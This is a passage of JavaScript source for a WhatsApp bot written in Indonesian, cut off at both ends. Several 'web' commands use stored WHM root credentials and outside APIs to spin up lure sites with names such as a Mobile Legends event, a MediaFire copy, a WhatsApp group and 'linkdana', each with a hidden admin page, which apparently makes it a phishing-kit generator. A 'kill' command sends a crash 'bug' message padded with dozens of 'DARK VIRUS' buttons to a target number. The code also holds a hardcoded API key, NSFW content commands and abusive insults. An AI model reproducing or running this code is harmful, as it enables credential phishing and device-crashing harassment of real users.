        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mediafiree" + makeid(7) + "." + "mediaflare1.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://yogax.my.id/apiku/mediafire2/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mediafire2",
                    path: pathh,
                }

                request.post({
                    url: 'https://yogax.my.id/apiku/mediafire2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web Mediafire FILE\n==========================\nWebsite : https://${domin}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
	reply("ini grup siapa bangsat")
	}
	break

case 'web3' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + "event-terbaru.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://yogax.my.id/apiku/simontok/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "simontok",
                    path: pathh,
                }

                request.post({
                    url: 'https://yogax.my.id/apiku/simontok/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web Simontok\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
        break

case 'web4' :

id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mobilelegends-event" + makeid(7) + "." + "event-terbaru.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://yogax.my.id/apiku/mlbb/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://yogax.my.id/apiku/mlbb/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web Mobile Legends\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
        break

case 'web5' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "join-whatsapp" + makeid(7) + "." + "viralbokepnew2022.ml"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://yogax.my.id/apiku/groupwa1/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "groupwa1",
                    path: pathh,
                }

                request.post({
                    url: 'https://yogax.my.id/apiku/groupwa1/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web GroupWA V1\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
        break

case 'web7' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "chat-whatsapps" + makeid(7) + "." + "event-terbaru.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://yogax.my.id/apiku/groupwa2/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "groupwa2",
                    path: pathh,
                }

                request.post({
                    url: 'https://yogax.my.id/apiku/groupwa2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web GroupWA V2\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
        break

case 'web11' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "linkdana-id" + makeid(7) + "." + "polaris.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("sedang membuat... tunggu ± 1 menit")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.rakaganz.xyz/arga//createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "daget",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.rakaganz.xyz/arga//upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("_*BERHASIL!*, Data Telah di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam kalo masih spam buta kids)_")
                    }


                    hasillrndy = `- Web Dana Kaget\n==========================\nWebsite : https://${domain}\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/nextnesia.php\n==========================\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
break
case 'jadivirtex': {
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
if (!q) return diablobotwhatsapp.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lynn`)
let teks = `${q}`
{
diablo.sendMessage(diablobotwhatsapp.chat, { image: ppnyauser, caption: `🔥 ${teks} ${iphone}` }, { quoted:diablobotwhatsapp })
}
}
break
case 'tiktok':
 if(!text) return diablobotwhatsapp.reply(`Linknya?`)
 anu = await fetchJson(`https://api.yanzbotzz.repl.co/api/download/tiktok?url=${text}&apikey=YanzBotz`)
 diablo.sendMessage(diablobotwhatsapp.chat, { video: { url: anu.result.video.no_watermark }, mimetype: 'video/mp4', fileName: `${anu.title}.mp4` }, { quoted: diablobotwhatsapp })
break
case 'emojimix': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
case 'ytmp4':
if (!text) throw `Example : ${prefix + command} Link Nya`
let isLinks= args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks) return m.reply(`Linknya Jelek`)
diablobotwhatsapp.reply(mess.wait)
anu = await ytMp4(`${q}`)
titlenyaa = `TITLE BERHASIL DI DAPATKAN\n\nJudul : ${anu.title}\nUpload : ${anu.uploadDate}\nSize : ${anu.size}\nViews : ${anu.views}\nLike : ${anu.likes}\nDislike : ${anu.dislike}\nChannel : ${anu.channel}\nDeskripsi : ${anu.desc}\n\nMOHON TUNGGU SEDANG MENGIRIM MEDIA`
diablo.sendMessage(diablobotwhatsapp.chat, { image: { url: anu.thumb }, caption: `${titlenyaa}`}, { quoted: diablobotwhatsapp })
diablo.sendMessage(diablobotwhatsapp.chat, { video: { url: anu.result }, mimetype: 'video/mp4', fileName: `${anu.title}.mp4` }, { quoted: diablobotwhatsapp })
      break            
case 'ytmp3':
if (!text) throw `Example : ${prefix + command} Link Nya`
let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks2) return m.reply(`Linknya Jelek`)
diablobotwhatsapp.reply(mess.wait)
anu = await ytmp3(`${q}`)
titlenyaa = `TITLE BERHASIL DI DAPATKAN\n\nJudul : ${anu.title}\nUpload : ${anu.uploadDate}\nSize : ${anu.size}\nViews : ${anu.views}\nLike : ${anu.likes}\nDislike : ${anu.dislike}\nChannel : ${anu.channel}\nDeskripsi : ${anu.desc}\n\nMOHON TUNGGU SEDANG MENGIRIM MEDIA`
diablo.sendMessage(diablobotwhatsapp.chat, { image: { url: anu.thumb }, caption: `${titlenyaa}`}, { quoted: diablobotwhatsapp })
diablo.sendMessage(diablobotwhatsapp.chat, { audio: { url: anu.result }, mimetype: 'audio/mpeg', fileName: `${anu.title}.mp3` }, { quoted: diablobotwhatsapp })
break
case 'neko':
diablobotwhatsapp.reply(mess.wait)						
   waifud = await axios.get('https://waifu.pics/api/sfw/neko')
                var wbutsss = [
        {buttonId: `animeneko`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonssMessage = {
       image: {url:waifud.data.url},
       caption:  `Solid??`,
      footer: `Tanzz`,
      buttons: wbutsss,
      headerType: 4
      }
            await diablo.sendMessage(diablobotwhatsapp.chat,buttonssMessage, { quoted:diablobotwhatsapp }).catch(err => {
                    return('Error!')
                })
break
case 'hentai-neko' :
case 'hneko' :
if (!diablobotwhatsapp.isGroup) return diablobotwhatsapp.reply(mess.group)
if (!diablobotwhatsapp.isGroup) return diablobotwhatsapp.reply(mess.owner)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let hnekobot = [
    {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
    ]
  let button3Messages = {
   image: {url:waifudd.data.url},
   caption:  `Ewe Mas🥵`,
  buttons: hnekobot,
  headerType: 1
  }      
            await diablo.sendMessage(diablobotwhatsapp.chat, button3Messages, { quoted:diablobotwhatsapp }).catch(err => {
                    return('Error!')
                })          
break
case 'ppcp': {
                diablobotwhatsapp.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                diablo.sendMessage(diablobotwhatsapp.chat, { image: { url: random.male }, caption: `Cowoknya` }, { quoted: diablobotwhatsapp })
                diablo.sendMessage(diablobotwhatsapp.chat, { image: { url: random.female }, caption: `Ceweknya` }, { quoted: diablobotwhatsapp })
           }
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await haikal.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}    
break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await diablo.sendImageAsSticker(from, wifegerakx, diablobotwhatsapp, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'verify': {
 if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
if (!isGroupAdmins) return diablobotwhatsapp.reply(`*LU JANGAN SOK ASIK KONTOL*`)

if (!args[0]) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await diablo.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Nomornya ga jumpa anjir`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
diablobotwhatsapp.reply(`Nomor ${bnnd} IS VERIFY TO USE BOT. FITUR UNLOCK ACCES TO BUG⚔️`)
}
break
case 'waifu':
    case 'loli':
    case 'husbu':
    case 'milf':
    case 'cosplay':
    case 'wallml':
    diablobotwhatsapp.reply(mess.wait)
          let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
          let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
          diablo.sendMessage(diablobotwhatsapp.chat, { image: { url: wipi }, caption: `${command}` }, { quoted: diablobotwhatsapp })
break
case 'unverify':
    if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
if (!isGroupAdmins) return diablobotwhatsapp.reply(`*LU JANGAN SOK ASIK. JIJIK GW*`)
        
if (!args[0]) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
diablobotwhatsapp.reply(`Nomor ${ya} Sudah Tidak Bisa Akses Bot. Awkwkwkwkw Ga bisa akses bot🤣`)
break
case 'tag': {
 if (!itsMediablo) return diablobotwhatsapp.reply(`Lu siapa? Belum Premium Mau Guna Fitur Tag🤣`)
   
diablo.sendMessage(diablobotwhatsapp.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: diablobotwhatsapp })
}
break
case 'test':
case 'stats':{
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`
diablobotwhatsapp.reply(respon)
}
 case 'kill':
         if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
           if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
        txts = `BOT TELAH MENGIRIM BUG😎. GAK C1? BUKAN MASAALAH GW`
        diablobotwhatsapp.reply(txts)
        
    
      if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '20'
        waktu = `4s`
    // KALO MAU BUTTON BANYAK COPY BUTTON NYA TRUS BANYAKIN CONTOH DI BAWAH INI NGENTOT
/* templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
